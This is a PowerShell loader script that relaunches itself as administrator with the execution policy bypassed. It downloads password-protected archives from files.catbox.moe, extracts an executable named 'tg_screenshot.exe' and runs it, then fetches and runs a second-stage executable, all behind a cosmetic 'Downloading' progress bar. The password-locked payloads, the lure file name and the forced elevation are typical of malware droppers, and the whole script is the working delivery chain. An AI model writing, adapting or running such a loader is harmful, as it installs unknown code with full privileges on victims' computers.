#requires -version 5.1

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

# ---------------- SETTINGS ----------------
# First file. It runs first; the second archive downloads only if this exits with code 0.
$FirstDownloadUrl = 'https://files.catbox.moe/w920hn.zip'
$FirstFileName = 'tg_screenshot.exe'
$FirstFileIsArchive = $true
$FirstArchivePassword = 'dasfrvnaevioea'
$FirstExeSearchPattern = '*.exe'

# Second password-protected archive.
$SecondDownloadUrl = 'https://files.catbox.moe/6oowzw.zip'

# PASSWORD HERE
$SecondArchivePassword = '2026'
$SecondExeSearchPattern = '*.exe'

# Put your direct ZIP with 7z.exe first. Example ZIP contents:
#   7z.exe
# or:
#   7-Zip\7z.exe
$SevenZipZipDownloadUrls = @(
    'https://files.catbox.moe/xkdt3v.zip'
)

# Optional installer fallback. Use only if your host can serve .exe files.
$SevenZipDownloadUrls = @(
    'https://your-server.example.com/7z2409-x64.exe',
    'https://www.7-zip.org/a/7z2409-x64.exe'
)
$SevenZipPath = ''
$ProgressRow = 0
$ProgressRed = 0
$ProgressGreen = 255
$ProgressBlue = 180
# ------------------------------------------

$LogPath = Join-Path $PSScriptRoot 'download_extract_run_admin.log'

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Write-Log {
    param([string]$Message)

    try {
        Add-Content -LiteralPath $LogPath -Value ('[{0}] {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Message)
    }
    catch {
    }
}

function Write-ProgressBar {
    param(
        [int]$Percent
    )

    $Percent = [Math]::Max(0, [Math]::Min(100, $Percent))
    $filled = [Math]::Floor($Percent / 10)
    $empty = 10 - $filled
    $bar = ('o' * $filled) + ('-' * $empty)

    $row = [Math]::Max(0, [Math]::Min($ProgressRow, [Console]::BufferHeight - 1))
    [Console]::SetCursorPosition(0, $row)

    $esc = [char]27
    $color = "$($esc)[38;2;$ProgressRed;$ProgressGreen;$ProgressBlue`m"
    $reset = "$($esc)[0m"
    $title = 'Downloading'
    $progress = "[$bar] $Percent%"
    $titleTail = ' ' * [Math]::Max(0, [Console]::WindowWidth - $title.Length - 1)
    $progressTail = ' ' * [Math]::Max(0, [Console]::WindowWidth - $progress.Length - 1)

    [Console]::Write($color + $title + $reset + $titleTail)

    $barRow = [Math]::Max(0, [Math]::Min(($row + 1), [Console]::BufferHeight - 1))
    [Console]::SetCursorPosition(0, $barRow)
    [Console]::Write($color + $progress + $reset + $progressTail)
}

function Write-Success {
    $row = [Math]::Max(0, [Math]::Min(($ProgressRow + 2), [Console]::BufferHeight - 1))
    [Console]::SetCursorPosition(0, $row)

    Write-Host 'Success!' -ForegroundColor Green
}

function Write-ErrorPosition {
    $row = [Math]::Max(0, [Math]::Min(($ProgressRow + 3), [Console]::BufferHeight - 1))
    [Console]::SetCursorPosition(0, $row)
}

function Download-FileWithProgress {
    param(
        [string]$Url,
        [string]$OutFile,
        [int]$StartPercent,
        [int]$EndPercent
    )

    $request = [System.Net.WebRequest]::Create($Url)
    $request.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    $request.Accept = '*/*'
    $request.KeepAlive = $false
    $request.Timeout = 60000
    $request.ReadWriteTimeout = 60000
    $response = $null
    $inputStream = $null
    $outputStream = $null

    try {
        try {
            $response = $request.GetResponse()
        }
        catch {
            Write-Log "Stream download failed for $Url. Falling back to Invoke-WebRequest. $($_.Exception.Message)"
            Write-ProgressBar -Percent $StartPercent
            Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -Headers @{
                'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            Write-ProgressBar -Percent $EndPercent
            return
        }

        $inputStream = $response.GetResponseStream()
        $outputStream = [System.IO.File]::Open($OutFile, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
        $totalBytes = $response.ContentLength
        $downloadedBytes = 0L
        $lastPercent = -1
        $buffer = New-Object byte[] 65536

        Write-ProgressBar -Percent $StartPercent

        while ($true) {
            $read = $inputStream.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) {
                break
            }

            $outputStream.Write($buffer, 0, $read)
            $downloadedBytes += $read

            if ($totalBytes -gt 0) {
                $downloadPercent = [Math]::Floor(($downloadedBytes * 100) / $totalBytes)
            }
            else {
                $downloadPercent = [Math]::Min(90, (($downloadedBytes / 262144) % 10) * 10)
            }

            $percent = $StartPercent + [Math]::Floor((($EndPercent - $StartPercent) * $downloadPercent) / 100)
            if ($percent -ne $lastPercent) {
                Write-ProgressBar -Percent $percent
                $lastPercent = $percent
            }
        }

        Write-ProgressBar -Percent $EndPercent
    }
    finally {
        if ($outputStream) {
            $outputStream.Dispose()
        }
        if ($inputStream) {
            $inputStream.Dispose()
        }
        if ($response) {
            $response.Dispose()
        }
    }
}

function Invoke-WithProgress {
    param(
        [int]$StartPercent,
        [int]$EndPercent,
        [scriptblock]$Action
    )

    Write-ProgressBar -Percent $StartPercent
    & $Action
    Write-ProgressBar -Percent $EndPercent
}

function Get-SevenZipPath {
    if ($SevenZipPath -and (Test-Path -LiteralPath $SevenZipPath)) {
        return $SevenZipPath
    }

    $paths = @(
        (Join-Path $PSScriptRoot '7z.exe'),
        (Join-Path $PSScriptRoot '7-Zip\7z.exe'),
        "$env:ProgramFiles\7-Zip\7z.exe",
        "${env:ProgramFiles(x86)}\7-Zip\7z.exe",
        (Join-Path $env:TEMP '7zip\7z.exe')
    )

    $registryPaths = @(
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )

    $installLocations = Get-ItemProperty -Path $registryPaths -ErrorAction SilentlyContinue |
        Where-Object {
            $_.PSObject.Properties['DisplayName'] -and
            $_.PSObject.Properties['InstallLocation'] -and
            $_.DisplayName -like '7-Zip*' -and
            $_.InstallLocation
        } |
        Select-Object -ExpandProperty InstallLocation

    foreach ($location in $installLocations) {
        $paths += Join-Path $location '7z.exe'
    }

    foreach ($path in $paths) {
        if ($path -and (Test-Path -LiteralPath $path)) {
            return $path
        }
    }

    return $null
}

function Get-SevenZipFromZip {
    param(
        [string]$ZipPath,
        [string]$ExtractPath
    )

    if (Test-Path -LiteralPath $ExtractPath) {
        Remove-Item -LiteralPath $ExtractPath -Recurse -Force
    }

    New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null
    Expand-Archive -LiteralPath $ZipPath -DestinationPath $ExtractPath -Force

    $sevenZipExe = Get-ChildItem -LiteralPath $ExtractPath -Filter '7z.exe' -File -Recurse |
        Select-Object -First 1

    if (-not $sevenZipExe) {
        throw "7z.exe was not found inside ZIP: $ZipPath"
    }

    return $sevenZipExe.FullName
}

function Install-SevenZipIfNeeded {
    param(
        [string]$InstallerPath,
        [string]$ZipPath,
        [string]$ZipExtractPath
    )

    $sevenZip = Get-SevenZipPath
    if ($sevenZip) {
        return $sevenZip
    }

    $lastZipError = $null
    foreach ($url in $SevenZipZipDownloadUrls) {
        if (-not $url -or $url -like 'https://your-server.example.com/*') {
            continue
        }

        try {
            Download-FileWithProgress -Url $url -OutFile $ZipPath -StartPercent 5 -EndPercent 15
            $sevenZip = Get-SevenZipFromZip -ZipPath $ZipPath -ExtractPath $ZipExtractPath
            Write-ProgressBar -Percent 20
            return $sevenZip
        }
        catch {
            $lastZipError = $_.Exception.Message
            Write-Log "7-Zip ZIP download/extract failed from $url. $lastZipError"
        }
    }

    $downloaded = $false
    $lastDownloadError = $null

    foreach ($url in $SevenZipDownloadUrls) {
        if (-not $url -or $url -like 'https://your-server.example.com/*') {
            continue
        }

        try {
            Download-FileWithProgress -Url $url -OutFile $InstallerPath -StartPercent 5 -EndPercent 15
            $downloaded = $true
            break
        }
        catch {
            $lastDownloadError = $_.Exception.Message
            Write-Log "7-Zip download failed from $url. $lastDownloadError"
        }
    }

    if (-not $downloaded) {
        throw "Could not download 7-Zip. Put 7z.exe next to this script, set your ZIP URL in `$SevenZipZipDownloadUrls, or set installer URL in `$SevenZipDownloadUrls. Last ZIP error: $lastZipError. Last installer error: $lastDownloadError"
    }

    Invoke-WithProgress -StartPercent 15 -EndPercent 20 -Action {
        Start-Process -FilePath $InstallerPath -ArgumentList '/S' -Wait
    }

    $sevenZip = Get-SevenZipPath
    if (-not $sevenZip) {
        throw '7-Zip installation finished, but 7z.exe was not found.'
    }

    return $sevenZip
}

function Expand-ArchiveWithSevenZip {
    param(
        [string]$SevenZip,
        [string]$ArchivePath,
        [string]$ExtractPath,
        [string]$Password,
        [int]$StartPercent,
        [int]$EndPercent
    )

    $sevenZipArgs = @('x', $ArchivePath, "-o$ExtractPath", '-y', "-p$Password")

    Invoke-WithProgress -StartPercent $StartPercent -EndPercent $EndPercent -Action {
        & $SevenZip @sevenZipArgs | Out-Null
    }

    if ($LASTEXITCODE -ne 0) {
        throw "7-Zip extraction failed. Exit code: $LASTEXITCODE"
    }
}

function Get-SingleExe {
    param(
        [string]$Folder,
        [string]$Pattern
    )

    $exeFiles = @(Get-ChildItem -LiteralPath $Folder -Filter $Pattern -File -Recurse)

    if ($exeFiles.Count -eq 0) {
        throw "No exe file found by pattern '$Pattern' in: $Folder"
    }

    if ($exeFiles.Count -gt 1) {
        Write-Host 'More than one exe file found:'
        $exeFiles | ForEach-Object { Write-Host $_.FullName }
        throw "Set a more specific exe search pattern."
    }

    return $exeFiles[0].FullName
}

try {
    if (-not (Test-IsAdministrator)) {
        Start-Process -FilePath 'powershell.exe' -ArgumentList @(
            '-NoProfile',
            '-ExecutionPolicy', 'Bypass',
            '-File', $PSCommandPath
        ) -Verb RunAs
        exit
    }

    Write-Log 'Script started.'
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::SystemDefault

    $workRoot = Join-Path $env:TEMP ('download_extract_run_{0}' -f ([guid]::NewGuid().ToString('N')))
    $firstFilePath = Join-Path $workRoot $FirstFileName
    $firstExtractPath = Join-Path $workRoot 'first_extracted'
    $secondArchivePath = Join-Path $workRoot 'second_archive.zip'
    $secondExtractPath = Join-Path $workRoot 'second_extracted'
    $sevenZipInstallerPath = Join-Path $workRoot '7zip.exe'
    $sevenZipZipPath = Join-Path $workRoot '7zip.zip'
    $sevenZipZipExtractPath = Join-Path $workRoot '7zip_portable'

    New-Item -ItemType Directory -Path $workRoot, $firstExtractPath, $secondExtractPath -Force | Out-Null

    Clear-Host
    Write-ProgressBar -Percent 0

    $sevenZip = $null
    if ($FirstFileIsArchive -or $SecondArchivePassword) {
        $sevenZip = Install-SevenZipIfNeeded -InstallerPath $sevenZipInstallerPath -ZipPath $sevenZipZipPath -ZipExtractPath $sevenZipZipExtractPath
    }
    else {
        Write-ProgressBar -Percent 20
    }

    if ($FirstDownloadUrl -and $FirstDownloadUrl -ne 'https://example.com/first.exe') {
        Download-FileWithProgress -Url $FirstDownloadUrl -OutFile $firstFilePath -StartPercent 20 -EndPercent 40

        if ($FirstFileIsArchive) {
            Expand-ArchiveWithSevenZip -SevenZip $sevenZip -ArchivePath $firstFilePath -ExtractPath $firstExtractPath -Password $FirstArchivePassword -StartPercent 40 -EndPercent 50
            $firstRunPath = Get-SingleExe -Folder $firstExtractPath -Pattern $FirstExeSearchPattern
        }
        else {
            $firstRunPath = $firstFilePath
            Write-ProgressBar -Percent 50
        }

        Write-Log "Opening first file: $firstRunPath"
        Write-ProgressBar -Percent 55
        $firstProcess = Start-Process -FilePath $firstRunPath -WorkingDirectory (Split-Path -Path $firstRunPath -Parent) -Wait -PassThru
        Write-ProgressBar -Percent 60

        if ($firstProcess.ExitCode -ne 0) {
            Write-Log "First file exit code: $($firstProcess.ExitCode)"
            exit $firstProcess.ExitCode
        }
    }
    else {
        Write-ProgressBar -Percent 60
    }

    Download-FileWithProgress -Url $SecondDownloadUrl -OutFile $secondArchivePath -StartPercent 60 -EndPercent 80

    Expand-ArchiveWithSevenZip -SevenZip $sevenZip -ArchivePath $secondArchivePath -ExtractPath $secondExtractPath -Password $SecondArchivePassword -StartPercent 80 -EndPercent 95

    $secondRunPath = Get-SingleExe -Folder $secondExtractPath -Pattern $SecondExeSearchPattern

    Write-Log "Opening second file: $secondRunPath"
    Start-Process -FilePath $secondRunPath -WorkingDirectory (Split-Path -Path $secondRunPath -Parent)
    Write-ProgressBar -Percent 100
    Write-Success
}
catch {
    Write-ErrorPosition
    Write-Host ''
    Write-Host 'ERROR:' -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Write-Host ''
    Write-Host "Log file: $LogPath"

    try {
        Write-Log ('ERROR: ' + $_.Exception.Message)
        Add-Content -LiteralPath $LogPath -Value $_.ScriptStackTrace
    }
    catch {
    }

    Read-Host 'Press Enter to close'
    exit 1
}
